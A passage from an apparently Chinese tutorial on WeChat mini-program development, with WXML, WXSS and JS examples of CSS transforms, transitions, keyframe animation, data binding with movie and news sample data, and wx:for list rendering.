class="string">&quot;transform-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>缩放,scale(x,y)，x为长度缩放倍数，y为宽度缩放倍数，如果只有一个值，则是长和宽缩放的倍数<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;scale&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>平移,translate(x,y)，x为x轴平移的距离，y为y轴平移的距离，如果只有一个值，则是x和y轴缩放的距离，值可以为负数<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;translate&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span>&gt;</span>旋转,rotate()里的值为旋转的角度<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;rotate&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span>&gt;</span>倾斜,skew()里的值为旋转的角度<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;skew&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.transform-display</span> image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">80px</span>;<span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-class">.scale</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>,<span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.translate</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">500px</span>,<span class="number">20px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rotate</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.skew</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">skew</span>(<span class="number">120deg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x009-过渡属性Transition"><a href="#0x009-过渡属性Transition" class="headerlink" title="0x009 过渡属性Transition"></a>0x009 过渡属性Transition</h3><p><code>语法：transition: [transition-property] [transition-duration] [transition-timing-function] [transition-delay];&#125;</code></p><ul><li><strong>transition-property</strong>，应用过渡的 CSS 或动画属性的名称；</li><li><strong>transition-duration</strong>，整个过渡效果持续的时间，默认时间为0秒，所以要有过渡效果这个是必须定义的；</li><li><strong>transition-timing-function</strong>，规定过渡效果的时间曲线，默认为ease；</li><li><strong>transition-delay</strong>，过渡效果延迟多久，或者说何时开始，默认为0秒，不定义的话也就是直接开始；</li></ul><h3 id="0x010-背景颜色的变化"><a href="#0x010-背景颜色的变化" class="headerlink" title="0x010 背景颜色的变化"></a>0x010 背景颜色的变化</h3><p>  同样还是把下面的代码输入到小程序的页面当中，通过实战的方式来查看效果。</p><p>  使用开发者工具新建一个transition页面，然后在transition.wxml页面里面输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;transition-display&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;box bg-color&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;bg-color-hover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-class">.box</span>&#123;<span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: <span class="number">150px</span>;<span class="attribute">cursor</span>: pointer;&#125;</span><br><span class="line">  <span class="selector-class">.bg-color</span>&#123;</span><br><span class="line">      <span class="attribute">background-color</span>:green;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.bg-color-hover</span>&#123;</span><br><span class="line">      <span class="attribute">background-color</span>: yellow;</span><br><span class="line">      <span class="attribute">transition</span>: background-color <span class="number">5s</span> ease-out <span class="number">3s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  动画是需要触发的，这里我们使用的是<strong>悬停hover-class</strong>来触发效果，把鼠标放在元素上8秒以上，看一下正方形的背景颜色有什么变化。</p><p>  了解了效果之后，我们再来结合实际案例理解语法：</p><ul><li><p>因为我们是用hover来触发的，所以transition要写在元素的hover-class里，盒子之前的背景是绿色green，悬停的背景是黄色yellow；</p></li><li><p>因为我们改变的是盒子background-color，所以transition需要过渡的CSS属性名称，就是background-color；</p></li><li><p>动画过渡持续的时间，我们设置的是5秒，也就是背景由绿色变为黄色的时间；</p></li><li><p>这里的ease-out（慢速结束）是颜色过渡的时间曲线效果。还可以有linear（匀速）、ease-in（慢速开始）、ease-in-out（慢速开始和慢速结束）。持续的时间很短的情况下，这几个时间曲线效果差别是及其细微的，<strong>需要设计师对动画足够敏感了</strong>。</p></li><li><p>动画延迟的时间是3秒，也就是说3秒之后动画才开始。</p><p>一个综合案例，在transition.wxml里输入</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>盒子的多个属性一起动画: width, height, background-color, transform. 将鼠标或手指悬停在盒子上查看动画之后放开。<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;animatebox&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;animatebox-hover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  在transition.wxss里输入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-class">.animatebox</span> &#123;</span><br><span class="line">      <span class="attribute">display</span>: block;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#4a9d64</span>;</span><br><span class="line">      <span class="attribute">transition</span>:width <span class="number">2s</span>, height <span class="number">2s</span>, background-color <span class="number">2s</span>, transform <span class="number">2s</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.animatebox-hover</span> &#123;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#cd584a</span>;</span><br><span class="line">      <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">      <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">      <span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">180deg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x011-动画属性Animation"><a href="#0x011-动画属性Animation" class="headerlink" title="0x011 动画属性Animation"></a>0x011 动画属性Animation</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;fadeIn&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">view</span>&gt;</span>注意会有一个无限颜色渐变变化的动画<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> fadeIn &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="selector-class">.fadeIn</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: <span class="number">4s</span> linear <span class="number">0s</span> infinite alternate fadeIn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-数据绑定"><a href="#0x05-数据绑定" class="headerlink" title="0x05 数据绑定"></a>0x05 数据绑定</h2><h3 id="0x001-数据分离"><a href="#0x001-数据分离" class="headerlink" title="0x001 数据分离"></a>0x001 数据分离</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;username&#125;&#125;，您已登录，欢迎<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在js的data里面插入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line"> <span class="attr">username</span>:<span class="string">&quot;xx&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data 是小程序的页面第一次渲染使用的<strong>初始数据</strong>。小程序的页面加载时， data 将会以 JSON字符串的形式由逻辑层传至渲染层，因此 data中的数据必须是可以转成 JSON的类型：字符串String，数字Number，布尔值Boolean，对象Object，数组Array。</p><h3 id="0x002-数据类型"><a href="#0x002-数据类型" class="headerlink" title="0x002 数据类型"></a>0x002 数据类型</h3><p>通过前面的案例我们了解到WXML 中的动态数据均来自对应 Page 的 data。 data 是小程序的页面第一次渲染使用的<strong>初始数据</strong>。小程序的页面加载时， data 将会以 JSON字符串的形式由逻辑层传至渲染层，因此 data中的数据必须是可以转成 JSON的类型：字符串String，数字Number，布尔值Boolean，对象Object，数组Array。</p><ul><li><strong>字符串String</strong>，用于存储和处理文本，可以结合Excel单元格格式里的文本格式来理解；</li><li><strong>数字Number</strong>，这个很好理解，比如233这个数，它的数字格式和文本格式是有很大不同的，学Excel一定不会陌生；</li><li><strong>布尔值Boolean</strong>，就是true和false，虽然只有两个值，但是它代表着两种选择，两种不同的条件，两种不同的结果；</li><li><strong>对象Object</strong>，结合之前所学，我们再来回顾一下：对象由大括号{}分隔，在大括号{}内部，对象的属性以名称和值对的形式 name : value来定义，属性由逗号,分隔</li><li><strong>数组Array</strong>，结合之前所学，我们再来回顾一下：数组由中括号[ ]来分割，有点类似于列表；</li></ul><h3 id="0x003-组件属性的渲染"><a href="#0x003-组件属性的渲染" class="headerlink" title="0x003 组件属性的渲染"></a>0x003 组件属性的渲染</h3><p>通过数据绑定，我们还可以把 style、class 、id等属性分离出来来控制组件的样式等信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">navigator</span> <span class="attr">id</span>=<span class="string">&quot;item-&#123;&#123;id&#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&#123;&#123;itemclass&#125;&#125;&quot;</span> <span class="attr">url</span>=<span class="string">&quot;&#123;&#123;itemurl&#125;&#125;&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">style</span>=<span class="string">&quot;width: &#123;&#123;imagewidth&#125;&#125;&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;&#123;&#123;imagemode&#125;&#125;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;imagesrc&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">233</span>,</span><br><span class="line">  <span class="attr">itemurl</span>:<span class="string">&quot;/pages/home/imgshow/imgshow&quot;</span>,</span><br><span class="line">  <span class="attr">itemclass</span>:<span class="string">&quot;event-item&quot;</span>,</span><br><span class="line">  <span class="attr">imagesrc</span>: <span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>,</span><br><span class="line">  <span class="attr">imagemode</span>:<span class="string">&quot;widthFix&quot;</span>,</span><br><span class="line">  <span class="attr">imagewidth</span>:<span class="string">&quot;100%&quot;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在模拟器里查看显示的效果，发现显示的结果上和之前不采用数据绑定没有什么区别，<em><strong>但是用数据绑定的好处是为我们以后添加大量数据以及进行编程更新打下了基础。</strong></em></p><h3 id="0x004-渲染数组里的单条数据"><a href="#0x004-渲染数组里的单条数据" class="headerlink" title="0x004 渲染数组里的单条数据"></a>0x004 渲染数组里的单条数据</h3><p>格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;newstitle[0]&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">   <span class="attr">newstitle</span>:[</span><br><span class="line">     </span><br><span class="line">   ],</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-渲染对象类型的数据"><a href="#0x005-渲染对象类型的数据" class="headerlink" title="0x005 渲染对象类型的数据"></a>0x005 渲染对象类型的数据</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movie.img&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:300rpx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>电影名：&#123;&#123;movie.name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>英文名：&#123;&#123;movie.englishname&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>国家：&#123;&#123;movie.country&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行年份：&#123;&#123;movie.year&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>简述：&#123;&#123;movie.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">movie</span>: &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">      <span class="attr">englishname</span>:<span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">      <span class="attr">country</span>:<span class="string">&quot;美国&quot;</span>,</span><br><span class="line">      <span class="attr">year</span>:<span class="number">1994</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象Object类型的数据就被渲染出来:在双大括号&#123;&#123;&#125;&#125;里，输入变量movie+点+属性名即可，这就是**对象的点表示法**。</span><br></pre></td></tr></table></figure><h3 id="0x006-复杂的数据嵌套"><a href="#0x006-复杂的数据嵌套" class="headerlink" title="0x006 复杂的数据嵌套"></a>0x006 复杂的数据嵌套</h3><p>对象是可以嵌套的，也就是一个对象可以作为另外一个对象的值，除了对象里套对象，数组里也可以套对象，对象里也可以套数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">movies</span>:[</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">       <span class="attr">englishname</span>: <span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">       <span class="attr">country</span>: <span class="string">&quot;美国&quot;</span>,</span><br><span class="line">       <span class="attr">year</span>: <span class="number">1994</span>,</span><br><span class="line">       <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">       <span class="attr">desc</span>: <span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span>,</span><br><span class="line">       <span class="attr">actor</span>:[</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;蒂姆·罗宾斯&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>:<span class="string">&quot;安迪·杜佛兰&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;摩根·弗里曼&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>:<span class="string">&quot;艾利斯·波伊德·瑞德&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,</span><br><span class="line">       <span class="attr">englishname</span>: <span class="string">&quot;Farewell My Concubine&quot;</span>,</span><br><span class="line">       <span class="attr">country</span>: <span class="string">&quot;中国&quot;</span>,</span><br><span class="line">       <span class="attr">year</span>: <span class="number">1993</span>,</span><br><span class="line">       <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2561716440.webp&quot;</span>,</span><br><span class="line">       <span class="attr">desc</span>: <span class="string">&quot;风华绝代&quot;</span>,</span><br><span class="line">       <span class="attr">actor</span>: [</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>: <span class="string">&quot;张国荣&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>: <span class="string">&quot;程蝶衣&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>: <span class="string">&quot;张丰毅&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>: <span class="string">&quot;段小楼&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br><span class="line">   ],</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>豆瓣电影排名第2、最重要的主演演员名：<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;movies[1].actor[0].name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示即可出现我们想要的结果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movies[1].img&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:300rpx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>电影名：&#123;&#123;movies[1].name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>英文名：&#123;&#123;movies[1].englishname&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行地：&#123;&#123;movies[1].country&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行年份：&#123;&#123;movies[1].year&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>简述：&#123;&#123;movies[1].desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将第二部电影的数据全部渲染</p><p>以上适用于电影或者新闻列表渲染</p><h2 id="0x06-列表渲染与条件渲染"><a href="#0x06-列表渲染与条件渲染" class="headerlink" title="0x06 列表渲染与条件渲染"></a>0x06 列表渲染与条件渲染</h2><h3 id="0x001-渲染数组里的所有数据"><a href="#0x001-渲染数组里的所有数据" class="headerlink" title="0x001 渲染数组里的所有数据"></a>0x001 渲染数组里的所有数据</h3><p><strong>相同的结构是列表渲染的前提</strong></p><p>在实际的开发场景里，商品、新闻、股票、收藏、书架列表等都会有几千上万条的数据，他们都有一个共同的特征就是数据的结构相同，这也是可以批量化渲染的前提。</p><p>Eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">newstitle</span>:[</span><br><span class="line">      <span class="string">&quot;瑞幸咖啡：有望在三季度达到门店运营的盈亏平衡点&quot;</span>,</span><br><span class="line">      <span class="string">&quot;腾讯：广告高库存量还是会持续到下一年&quot;</span>,</span><br><span class="line">      <span class="string">&quot;上汽集团云计算数据中心落户郑州，总投资20亿元&quot;</span>,</span><br><span class="line">      <span class="string">&quot;京东：月收入超2万元快递小哥数量同比增长163%&quot;</span>,</span><br><span class="line">      <span class="string">&quot;腾讯：《和平精英》日活跃用户已超五千万&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>将上述数据全部渲染出来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;newstitle&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;item&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里wx:for&#x3D;””，也就是在数组newstitle里进行循环，*this代表在 for 循环中的 item 本身，而的item是默认的。也可以使用如下方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for-items</span>=<span class="string">&quot;&#123;&#123;newstitle&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;title&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x002-wx-for"><a href="#0x002-wx-for" class="headerlink" title="0x002 wx:for"></a>0x002 wx:for</h3><p>在组件上使用 <code>wx:for</code> 